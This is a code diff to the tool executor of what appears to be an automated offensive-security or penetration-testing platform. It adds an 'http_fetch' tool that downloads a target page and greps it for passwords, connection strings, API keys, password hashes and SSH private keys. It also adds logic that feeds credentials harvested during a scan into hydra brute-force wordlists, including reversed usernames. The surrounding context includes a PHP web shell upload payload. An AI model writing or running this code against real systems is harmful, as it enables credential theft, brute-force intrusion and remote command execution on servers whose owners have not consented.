@@ -7,8 +7,9 @@
  */
 
 import { spawn } from 'node:child_process';
-import { accessSync } from 'node:fs';
+import { accessSync, writeFileSync, readFileSync, unlinkSync } from 'node:fs';
 import { env } from '../config/env.js';
+import { prisma } from '../config/database.js';
 import { emitReconOutput, emitLogEntry } from '../websocket/emitter.js';
 
 /** Extract hostname (without port) from a URL or hostname string. */
@@ -361,6 +362,42 @@ const TOOL_COMMANDS: Record<string, (target: string, opts: ToolOptions) => strin
     return ['sh', '-c', commands.join(' && ')];
   },
 
+  http_fetch: (target, opts) => {
+    const url = ensureHttpUrl(target);
+    const commands = [
+      `echo "=== HTTP FETCH: ${url} ==="`,
+      // Download the file
+      `CONTENT=$(curl -s --max-time 30 -L "${url}" 2>&1)`,
+      `echo "=== RAW CONTENT (first 2000 chars) ==="`,
+      `echo "$CONTENT" | head -c 2000`,
+      `echo ""`,
+      `echo "=== CREDENTIAL EXTRACTION ==="`,
+      // SQL passwords: INSERT INTO users, CREATE USER, IDENTIFIED BY, etc.
+      `echo "--- SQL Credentials ---"`,
+      `echo "$CONTENT" | grep -iE "(password|passwd|pwd|secret|credential|identified by|GRANT|CREATE USER)" | head -30`,
+      // Connection strings: mysql://, postgres://, mongodb://, redis://
+      `echo "--- Connection Strings ---"`,
+      `echo "$CONTENT" | grep -ioE "(mysql|postgres|postgresql|mongodb|redis|ftp|ssh)://[^'\"\\s]+" | head -10`,
+      // .env style: KEY=value patterns for passwords/secrets/keys
+      `echo "--- Environment Variables ---"`,
+      `echo "$CONTENT" | grep -iE "^[A-Z_]*(PASSWORD|SECRET|KEY|TOKEN|CREDENTIAL|DB_PASS|MYSQL_PASS|API_KEY)[A-Z_]*=" | head -20`,
+      // PHP config: $db_pass, $password, define('DB_PASSWORD', ...)
+      `echo "--- PHP Config ---"`,
+      `echo "$CONTENT" | grep -iE "(\\$.*pass|\\$.*secret|define\\s*\\(\\s*['\"].*PASS|define\\s*\\(\\s*['\"].*SECRET)" | head -20`,
+      // Hash patterns: MD5, SHA1, SHA256, bcrypt
+      `echo "--- Password Hashes ---"`,
+      `echo "$CONTENT" | grep -oE '\\$2[aby]\\$[0-9]+\\$[A-Za-z0-9./]{53}' | head -10`,
+      `echo "$CONTENT" | grep -oE '[a-f0-9]{32}' | sort -u | head -10`,
+      `echo "$CONTENT" | grep -oE '[a-f0-9]{40}' | sort -u | head -10`,
+      `echo "$CONTENT" | grep -oE '[a-f0-9]{64}' | sort -u | head -5`,
+      // SSH keys
+      `echo "--- SSH Keys ---"`,
+      `echo "$CONTENT" | grep -A 5 "BEGIN.*PRIVATE KEY" | head -10`,
+      `echo "=== FETCH COMPLETE ==="`,
+    ];
+    return ['sh', '-c', commands.join(' && ')];
+  },
+
   webshell_upload: (target, opts) => {
     const uploadUrl = opts.uploadUrl ?? `${target}/upload.php`;
     const shellContent = opts.shellContent ?? '<?php system($_GET["cmd"]); ?>';
@@ -467,12 +504,64 @@ class ToolExecutor {
     return name;
   }
 
+  /**
+   * Build a dynamic wordlist that includes discovered credentials from the DB.
+   * Appends any passwords/usernames found during the scan to the base wordlist.
+   * Returns path to the augmented temp file, or the original wordlist if no DB creds.
+   */
+  private async buildAugmentedWordlist(
+    baseWordlist: string,
+    targetHost: string,
+    type: 'passwords' | 'usernames',
+  ): Promise<string> {
+    try {
+      const creds = await prisma.credentialPair.findMany({
+        where: {
+          target: { hostname: targetHost },
+        },
+        select: { username: true, password: true },
+        distinct: type === 'passwords' ? ['password'] : ['username'],
+      });
+
+      if (creds.length === 0) return baseWordlist;
+
+      const extraEntries = creds.map((c) => type === 'passwords' ? c.password : c.username);
+      // Also add reversed versions of found usernames as passwords (common pattern like root->toor)
+      if (type === 'passwords') {
+        const userCreds = await prisma.credentialPair.findMany({
+          where: { target: { hostname: targetHost } },
+          select: { username: true },
+          distinct: ['username'],
+        });
+        for (const c of userCreds) {
+          extraEntries.push(c.username.split('').reverse().join(''));
+        }
+      }
+
+      const unique = [...new Set(extraEntries)].filter(Boolean);
+      if (unique.length === 0) return baseWordlist;
+
+      // Write augmented wordlist: discovered creds first (high priority), then base wordlist
+      const tmpPath = `/tmp/hydra_augmented_${type}_${Date.now()}.txt`;
+      let baseContent = '';
+      try { baseContent = readFileSync(baseWordlist, 'utf-8'); } catch { /* empty */ }
+      writeFileSync(tmpPath, unique.join('\n') + '\n' + baseContent);
+
+      console.log(`[ToolExec] Augmented ${type} wordlist: +${unique.length} from DB → ${tmpPath}`);
+      return tmpPath;
+    } catch (err) {
+      console.error(`[ToolExec] Failed to augment wordlist:`, err);
+      return baseWordlist;
+    }
+  }
+
   // Tool-specific timeout overrides (ms)
   private static readonly TOOL_TIMEOUTS: Record<string, number> = {
     metasploit: 600_000,   // 10 min — MSF loads slowly + multiple modules
     msf_exploit: 600_000,  // 10 min — MSF exploit execution
     zap: 600_000,          // 10 min — spider + active scan
     hydra: 600_000,        // 10 min — larger wordlists need more time
+    http_fetch: 60_000,    // 1 min — download + credential extraction
     ftp_browse: 120_000,   // 2 min — multiple FTP operations
     ftp_upload: 120_000,   // 2 min — upload + HTTP verify
     traceroute: 60_000,   // 1 min
@@ -503,7 +592,21 @@ class ToolExecutor {
       };
     }
 
-    const args = commandBuilder(target, opts);
+    let args = commandBuilder(target, opts);
+
+    // For hydra: augment wordlists with credentials discovered during the scan
+    if (tool === 'hydra') {
+      const host = extractHost(target);
+      const dashLIdx = args.indexOf('-L');
+      const dashPIdx = args.indexOf('-P');
+      if (dashLIdx !== -1 && dashLIdx + 1 < args.length) {
+        args[dashLIdx + 1] = await this.buildAugmentedWordlist(args[dashLIdx + 1], host, 'usernames');
+      }
+      if (dashPIdx !== -1 && dashPIdx + 1 < args.length) {
+        args[dashPIdx + 1] = await this.buildAugmentedWordlist(args[dashPIdx + 1], host, 'passwords');
+      }
+    }
+
     const binary = this.resolveBinary(args[0]);
     const spawnArgs = args.slice(1);
     const timeout = opts.timeout ?? ToolExecutor.TOOL_TIMEOUTS[tool] ?? 300_000;
@@ -554,6 +657,15 @@ class ToolExecutor {
           output: `[${tool}] Complete (${Math.round(duration / 1000)}s)`,
           complete: true,
         });
+
+        // Clean up any temporary augmented wordlists
+        if (tool === 'hydra') {
+          for (const arg of args) {
+            if (typeof arg === 'string' && arg.startsWith('/tmp/hydra_augmented_')) {
+              try { unlinkSync(arg); } catch { /* ignore */ }
+            }
+          }
+        }
 
         resolve({
           tool,
